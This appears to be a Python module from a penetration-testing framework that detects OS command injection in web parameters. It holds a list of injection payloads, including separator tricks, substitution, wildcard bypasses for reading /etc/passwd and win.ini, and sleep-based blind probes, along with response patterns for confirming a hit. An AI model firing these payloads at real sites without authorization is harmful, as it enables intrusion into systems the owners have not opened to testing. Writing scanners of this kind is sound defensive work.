"""RCE 命令注入检测器"""
import re
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get, http_post
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class RCEDetector(BaseDetector):
    """RCE 命令注入检测器"""

    name = "rce"
    category = "RCE"

    MARKER = "secopsrce7e8f"

    COMMAND_PAYLOADS = [
        # Linux
        (f"ls /etc/passwd", "Linux 命令执行"),
        (f"cat /etc/passwd", "Linux 文件读取"),
        (f"id", "Linux 用户信息"),
        (f"whoami", "Linux 当前用户"),
        (f"uname -a", "Linux 系统信息"),

        # Pipe 分隔符
        (f"| ls /etc", "管道符注入"),
        (f"|| ls /etc", "OR管道注入"),
        (f"; ls /etc", "分号注入"),
        (f"&& ls /etc", "AND管道注入"),

        # 反引号
        (f"`ls /etc`", "反引号注入"),

        # $() 子命令
        (f"$(ls /etc)", "子命令注入"),

        # Windows
        (f"dir C:\\Windows", "Windows 目录列出"),
        (f"type C:\\Windows\\win.ini", "Windows 文件读取"),
        (f"whoami", "Windows 用户信息"),

        # 通配符绕过
        (f"/???/??? /etc/passwd", "通配符绕过"),
        (f"/bin/?a? /etc/passwd", "通配符绕过2"),
    ]

    RESPONSE_PATTERNS = [
        (r"root:.*:0:0:", "Linux /etc/passwd"),
        (r"daemon:", "Linux /etc/passwd"),
        (r"bin:", "Linux /etc/passwd"),
        (r"\[fonts\]", "Windows win.ini"),
        (r"for 16-bit app", "Windows win.ini"),
        (r"uid=\d+", "Linux id 命令"),
        (r"gid=\d+", "Linux id 命令"),
        (r"Linux .* \d+\.\d+", "Linux uname -a"),
        (r"(C|D|E):\\", "Windows 目录"),
        (r"Volume Serial Number", "Windows dir 命令"),
        (r"apache|nginx|www-data|nobody", "Web 服务器用户"),
    ]

    BLIND_PAYLOADS = [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("|| sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("; ping -c 5 127.0.0.1", 5),
    ]

    def test(self, target_url: str, params: list = None) -> List[Finding]:
        findings = []

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["cmd", "exec", "command", "execute", "ping",
                          "host", "ip", "query", "file", "path",
                          "input", "data", "run", "system"]

        # 基线响应时间
        _, _, baseline_body = http_get(target_url)
        baseline_times = []
        for _ in range(2):
            t0 = time.time()
            http_get(target_url)
            baseline_times.append(time.time() - t0)
            time.sleep(0.1)
        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0

        # 带输出的命令注入
        for param in params:
            for payload, desc in self.COMMAND_PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("RCE_CMD", test_url, f"param={param}, payload={payload}")
                status, _, body = http_get(test_url, timeout=10)

                if status == 0:
                    continue

                for pattern, vuln_desc in self.RESPONSE_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append(Finding(
                            vuln_type="RCE", severity="critical",
                            title=f"命令注入 ({vuln_desc}) - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence=f"命令输出特征: {match.group()[:150] if (match := re.search(pattern, body, re.IGNORECASE)) else ''}",
                            description=f"参数 {param} 允许执行系统命令。{desc}",
                            remediation="使用白名单校验、避免拼接用户输入到命令、使用 API 替代命令执行"
                        ))
                        break

                if any("RCE" in f.vuln_type and param in f.title for f in findings):
                    break
                time.sleep(ATTACK_DELAY)

        # 盲注 (时间延迟)
        for param in params:
            if any("RCE" in f.vuln_type and param in f.title for f in findings):
                continue

            for payload, delay in self.BLIND_PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("RCE_BLIND", test_url, f"param={param}, payload={payload}")

                t0 = time.time()
                status, _, _ = http_get(test_url, timeout=delay + 8)
                elapsed = time.time() - t0

                if elapsed > (avg_baseline + delay - 1.5):
                    # 二次验证
                    t0 = time.time()
                    http_get(test_url, timeout=delay + 8)
                    elapsed2 = time.time() - t0

                    if elapsed2 > (avg_baseline + delay - 1.5):
                        findings.append(Finding(
                            vuln_type="RCE", severity="critical",
                            title=f"盲命令注入 (时间延迟) - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence=f"基线 {avg_baseline:.2f}s, 触发 {elapsed:.2f}s / {elapsed2:.2f}s",
                            description=f"参数 {param} 存在盲命令注入漏洞。",
                            remediation="使用白名单校验、避免拼接用户输入到命令"
                        ))
                        break

                time.sleep(ATTACK_DELAY)

        return findings
